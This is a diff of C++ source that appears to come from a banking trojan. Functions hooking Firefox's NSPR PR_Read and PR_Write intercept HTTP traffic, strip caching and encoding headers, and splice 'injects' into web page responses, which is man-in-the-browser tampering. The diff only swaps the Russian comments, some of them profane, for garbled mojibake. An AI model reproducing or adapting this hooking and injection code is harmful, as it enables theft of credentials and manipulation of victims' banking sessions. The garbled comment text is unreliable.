+		//пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 #		if defined WDEBUG2
 		WDEBUG2(WDDT_INFO, "HRIF_DEFINED_LENGTH, curSize=%u, info->contentLength=%u.", curSize, info->contentLength);
 #		endif
@@ -741,34 +752,34 @@ static int analizeHttpResponseBody(HTTPREQUESTINFO *info, const LPBYTE buffer, D
 			void *chunkData;
 			DWORD chunkDataSize;
 
-			if(nextChunk == end || (Mem::_findData(nextChunk, (end - nextChunk), "\r\n", 2) == NULL && Mem::_findData(nextChunk, (end - nextChunk), "\n", 1) == NULL))//FIXME: Лень/усталость.
+			if(nextChunk == end || (Mem::_findData(nextChunk, (end - nextChunk), "\r\n", 2) == NULL && Mem::_findData(nextChunk, (end - nextChunk), "\n", 1) == NULL))//FIXME: пїЅпїЅпїЅпїЅ/пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			{
 				retVal = 0;
-				break; //Не получен контент полностью.
+				break; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			}
 
 			if((nextChunk = HttpTools::_readChunkedData(nextChunk, (end - nextChunk), &chunkData, &chunkDataSize)) == NULL)
 			{
 				retVal = -1;
-				break; //Ошибка чтениния, игнарируем запрос.
+				break; //пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			}
 
 			if(chunkData == NULL)
 			{
 				retVal = 0;
-				break; //Не получен контент полностью.
+				break; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			}
 
 			if(chunkDataSize == 0)
 			{
 				retVal = 1;
-				break; //Контент прочитан.
+				break; //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			}
 
 			if(!Mem::reallocEx(&contentBuffer, contentBufferSize + chunkDataSize))
 			{
 				retVal = -1;
-				break; //Не достатчоно памяти.
+				break; //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			}
 
 			Mem::_copy(contentBuffer + contentBufferSize, chunkData, chunkDataSize);
@@ -855,7 +866,7 @@ __int32 __cdecl Nspr4Hook::hookerPrRead(void *fd, void *buf, __int32 amount)
 			}
 #			endif
 
-			//Доотправляем байты.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 			if(nc->pendingResponse.size > 0)
 			{
 sendPendingData:
@@ -868,7 +879,7 @@ sendPendingData:
 				Mem::_copy(buf, (LPBYTE)nc->pendingResponse.buf + nc->pendingResponse.pos, size);
 				nc->pendingResponse.pos += size;
 
-				//Буфер пуст.
+				//пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.
 				if(nc->pendingResponse.pos == nc->pendingResponse.size)
 				{
 					Mem::free(nc->pendingResponse.buf);
@@ -970,7 +981,7 @@ sendPendingData:
 				return readed;
 			}
 
-			//Читаем ответ самсотоятельно, если есть инжекты на эту страницу.
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(nc->injectsCount > 0)//FIXME: pipeline.
 			{
 #				if defined WDEBUG0
@@ -995,7 +1006,7 @@ sendPendingData:
 					}
 					else
 					{
-						//Обновляем буфер.
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 						if(readed > 0)
 						{
 							Mem::_copy(nc->response + nc->responseSize, buf, readed);
@@ -1005,7 +1016,7 @@ sendPendingData:
 #							endif
 						}
 
-						//Анализируем заглоловок.
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 						int analizeResult;
 						{
 							HTTPREQUESTINFO info;
@@ -1023,7 +1034,7 @@ sendPendingData:
 #									if defined WDEBUG1
 									WDEBUG1(WDDT_INFO, "Injects accepted, contentSize=%u.", contentSize);
 #									endif
-									//Переоормляем результат.
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 									LPBYTE newResponse = (LPBYTE)Mem::alloc(nc->responseSize - (info.contentEndOffset - info.contentOffset) + contentSize
 										+ 11 + 2 + 2  //Content-Length, chunk
 										+ 1 + 2 + 2); //final chunk
@@ -1047,7 +1058,7 @@ sendPendingData:
 											p  = (LPBYTE)Mem::_copy2(p, content, contentSize);
 										}
 
-										//Постфикс, параноя.
+										//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 										if(info.contentEndOffset != nc->responseSize)
 										{
 #											if defined WDEBUG1
@@ -1057,7 +1068,7 @@ sendPendingData:
 											p = (LPBYTE)Mem::_copy2(p, nc->response + info.contentEndOffset, nc->responseSize - info.contentEndOffset);
 										}
 
-										//Подменяем контент.
+										//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 										Mem::free(nc->response);
 										nc->response     = newResponse;
 										nc->responseSize = (DWORD)(p - newResponse);
@@ -1072,7 +1083,7 @@ sendPendingData:
 							}
 						}
 
-						//Заголовок еще не прочитан.
+						//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 						if(readed > 0 && analizeResult == 0)
 						{
 #							if defined WDEBUG0
@@ -1081,7 +1092,7 @@ sendPendingData:
 							prSetError(-5998L/*PR_WOULD_BLOCK_ERROR*/, 0);
 							readed = -1;
 						}            
-						//Анализ завершен для текущего запроса.
+						//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 						else if(readed == 0 || analizeResult == -1)
 						{
 #							if defined WDEBUG2
@@ -1116,7 +1127,7 @@ __int32 __cdecl Nspr4Hook::hookerPrWrite(void *fd, const void *buf, __int32 amou
 	if(DllCore::isActive() && buf != NULL && amount > 0)
 	{
 		/*
-			Я просто охуел писать этот алгоритм.
+			пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 		*/
 		NSPR4CONNECTION *nc = connectionFind((PRFILEDESC *)fd);
 		if(nc)
@@ -1133,8 +1144,8 @@ __int32 __cdecl Nspr4Hook::hookerPrWrite(void *fd, const void *buf, __int32 amou
 			}
 #			endif
 			
-			//Отылка помденненых данных вмест ооригинальных, которые не были отправлены при превром вызове PR_Write().
-			//Данный алгоритм корректен для блокируемых сокетов.
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ PR_Write().
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(nc->pendingRequest.size > 0)
 			{
 sendPendingData:
@@ -1151,7 +1162,7 @@ sendPendingData:
 #					if defined WDEBUG2
 					WDEBUG2(WDDT_INFO, "Written %i bytes of pending data, connection 0x%p", count, fd);
 #					endif
-					//Все отправлено.
+					//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 					if(count == size)
 					{
 						count = nc->pendingRequest.realSize;
@@ -1163,11 +1174,11 @@ sendPendingData:
 
 						Mem::_zero(&nc->pendingRequest, sizeof(nc->pendingRequest));
 					}
-					//Отправлено частично.
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 					else
 					{
 						nc->pendingRequest.pos += count;
-						nc->pendingRequest.realSize--; //Как сделать еше, хз.
+						nc->pendingRequest.realSize--; //пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅ.
 						count = 1;
 
 #						if defined WDEBUG3
@@ -1181,8 +1192,8 @@ sendPendingData:
 				return count;
 			}
 
-			//Проверяем сколько байт нужно пропустить от старого запроса.
-			//Данный алгоритм корректен для блокируемых сокетов, т.к. сюда из них попасть нельзя.
+			//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+			//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ.пїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			if(nc->writeBytesToSkip > 0)
 			{
 sendSkippedData:
@@ -1199,7 +1210,7 @@ sendSkippedData:
 					WDEBUG2(WDDT_INFO, "Written %i bytes of skipped bytes., connection 0x%p", count, fd);
 #					endif
 
-					//Сохраняем изменения.
+					//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 					if((DWORD)count <= nc->writeBytesToSkip)
 					{
 						nc->writeBytesToSkip -= (DWORD)count;
@@ -1210,7 +1221,7 @@ sendSkippedData:
 					}
 					else
 					{
-						//Т.е. если запросы будут отправлдяется одновремнно один за другим, мы нагнемся раком.
+						//пїЅ.пїЅ. пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 						connectionRemove(nc);
 						
 #						if defined WDEBUG3
@@ -1224,10 +1235,10 @@ sendSkippedData:
 				return count;
 			}
 
-			//Это новый запрос.
+			//пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 			{
-				//Получаем данные запроса. Firefox всегда отсылает за раз полный набор HTTP-заголовков, поэтому
-				//накоплением данных заниматься не нужно.
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ. Firefox пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ HTTP-пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+				//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ.
 				HttpGrabber::REQUESTDATA requestData;
 				DWORD result = fillRequestData(&requestData, (PRFILEDESC *)fd, buf, amount);
 
@@ -1244,7 +1255,7 @@ sendSkippedData:
 #					endif    
 				}
 
-				//Запрос некорректный, игнарируем соединение.
+				//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 				if(result == (DWORD)-1)
 				{
 					connectionRemove(nc);
@@ -1255,14 +1266,14 @@ sendSkippedData:
 				}
 				else 
 				{
-					//Запрос корректный, но он нам не интересен.
+					//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 					if(requestData.handle == NULL)
 					{
 #						if defined WDEBUG0
 						WDEBUG0(WDDT_INFO, "Request skipped.");
 #						endif
 					}
-					//Запрос корректен, отправляем на анализ.
+					//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 					else
 					{
 						DWORD analizeResult = HttpGrabber::analizeRequestData(&requestData);
@@ -1281,8 +1292,8 @@ sendSkippedData:
 								}
 								else
 								{
-									//FIXME: Pipeline, т.е. тупо  nc->injects делаем массивом.
-									//Старые инжекты могу сущестовать.
+									//FIXME: Pipeline, пїЅ.пїЅ. пїЅпїЅпїЅпїЅ  nc->injects пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+									//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 									HttpGrabber::_freeInjectFullDataList(nc->injects, nc->injectsCount);
 									Mem::free(nc->response);
 
@@ -1298,15 +1309,15 @@ sendSkippedData:
 									nc->response     = NULL;
 									nc->responseSize = 0;
 
-									//Удаляем заголовки.
+									//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 									newRequestSize = amount;                    
-									newRequestSize = HttpTools::_modifyMimeHeader(newRequest, newRequestSize, "Accept-Encoding", "identity");//FIXME: добавить, если не сущетвует.
+									newRequestSize = HttpTools::_modifyMimeHeader(newRequest, newRequestSize, "Accept-Encoding", "identity");//FIXME: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 									newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "TE");
-									newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "If-Modified-Since"); //Избавляемся чтением из кеша.
+									newRequestSize = HttpTools::_removeMimeHeader(newRequest, newRequestSize, "If-Modified-Since"); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ.
 								}
 							}
 
-							//Подменяем запрос. запрос самостоятельно.
+							//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 							if(newRequest != NULL)
 							{
 								HttpGrabber::_freeRequestData(&requestData);
